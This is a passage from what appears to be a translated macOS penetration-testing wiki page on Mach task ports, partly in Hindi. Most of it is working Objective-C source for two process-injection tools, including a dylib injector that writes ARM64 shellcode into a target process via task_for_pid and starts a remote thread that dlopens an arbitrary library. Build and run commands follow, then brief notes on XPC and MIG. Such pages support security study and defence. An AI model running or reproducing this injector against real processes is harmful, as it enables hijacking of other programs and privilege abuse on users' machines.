fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### टास्क पोर्ट के माध्यम से धारा में डायलिब इंजेक्शन

macOS में **थ्रेड** को **Mach** का उपयोग करके या **posix `pthread` एपीआई** का उपयोग करके मनिपुलेट किया जा सकता है। हमने पिछले इंजेक्शन में जिस थ्रेड को उत्पन्न किया था, वह Mach एपीआई का उपयोग करके उत्पन्न किया गया था, इसलिए **यह posix अनुरूप नहीं है**।

एक सरल शैलकोड को इंजेक्ट करना संभव था ताकि एक कमांड को निष्पादित किया जा सके क्योंकि इसे **posix अनुरूप एपीआई के साथ काम करने की आवश्यकता नहीं थी**, केवल Mach के साथ। **अधिक जटिल इंजेक्शन** के लिए **थ्रेड** को भी **posix अनुरूप होना** चाहिए।

इसलिए, **थ्रेड** को **सुधारने** के लिए यह कहा जा सकता है कि यह **`pthread_create_from_mach_thread`** को कॉल करना चाहिए जो एक मान्य pthread बनाएगा। फिर, इस नए pthread को **dlopen** को कॉल करने के लिए एक डायलिब लोड करने के लिए सिस्टम से, इसलिए नए शैलकोड लिखने की बजाय विभिन्न क्रियाएँ करने के लिए कस्टम पुस्तकालयों को लोड करना संभव है।

आप (उदाहरण के लिए जो एक लॉग उत्पन्न करता है और फिर आप इसे सुन सकते हैं) में **उदाहरण डायलिब** ढूंढ सकते हैं:

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"दूरस्थ धागे के कोड के लिए मेमोरी अनुमतियों को सेट करने में असमर्थ: त्रुटि %s\n", mach_error_string(kr));
return (-4);
}

// आवंटित स्टैक मेमोरी पर अनुमतियाँ सेट करें
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"दूरस्थ धागे के स्टैक के लिए मेमोरी अनुमतियों को सेट करने में असमर्थ: त्रुटि %s\n", mach_error_string(kr));
return (-4);
}


// शेलकोड चलाने के लिए धागा बनाएं
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // यह असली स्टैक है
//remoteStack64 -= 8;  // 16 की संरेखण की आवश्यकता है

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("दूरस्थ स्टैक 64  0x%llx, दूरस्थ कोड है %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"दूरस्थ धागा बनाने में असमर्थ: त्रुटि %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "उपयोग: %s _pid_ _क्रिया_\n", argv[0]);
fprintf (stderr, "   _क्रिया_: डिस्क पर एक डायलिब का पथ\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib नहीं मिली\n");
}

}
```
</details>  

### विवरण
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### धागा हाइजैकिंग के माध्यम से टास्क पोर्ट <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

इस तकनीक में प्रक्रिया का एक धागा हाइजैक किया जाता है:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### मौलिक जानकारी

XPC, जिसका मतलब है XNU (macOS द्वारा उपयोग किया जाने वाला कर्नेल) इंटर-प्रोसेस कम्युनिकेशन, macOS और iOS पर प्रक्रियाओं के बीच **संचार** के लिए एक फ्रेमवर्क है। XPC विभिन्न प्रक्रियाओं के बीच **सुरक्षित, असिंक्रोनस मेथड कॉल्स** करने के लिए एक तंत्र प्रदान करता है। यह Apple की सुरक्षा परिदृश्य का एक हिस्सा है, जो **विशेषाधिकार से अलग अनुप्रयोगों** का निर्माण संभव बनाता है जहाँ प्रत्येक **घटक** केवल उस अनुमतियों के साथ चलता है जो उसके काम को करने के लिए आवश्यक हैं, इससे किसी भी कंप्रोमाइज़ प्रक्रिया से होने वाली संभावित हानि को सीमित किया जाता है।

इस **संचार** काम कैसे करता है और यह **कैसे वंलरेबल** हो सकता है के बारे में अधिक जानकारी के लिए देखें:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - मैक इंटरफेस जेनरेटर

MIG को **मैक IPC** कोड निर्माण की प्रक्रिया को सरल बनाने के लिए बनाया गया था। इसलिए, RPC कार्य को कार्यान्वयन के लिए बहुत सारा काम समान क्रियाएं शामिल होती हैं (प्रारूपीकरण तत्वों को पैक करना, संदेश भेजना, सर्वर में डेटा को अनपैक करना...).

MIC मूल रूप से एक विशिष्ट परिभाषा (IDL -इंटरफेस परिभाषा भाषा-) के साथ सर्वर और क्लाइंट को संवाद करने के लिए आवश्यक कोड उत्पन्न करता है। यद्यपि उत्पन्न कोड बेहद बुरा हो, एक डेवलपर को इसे आयात करने की आवश्यकता होगी और उसका कोड पहले की तुलना में बहुत सरल होगा।

अधिक जानकारी के लिए देखें:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## संदर्भ

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
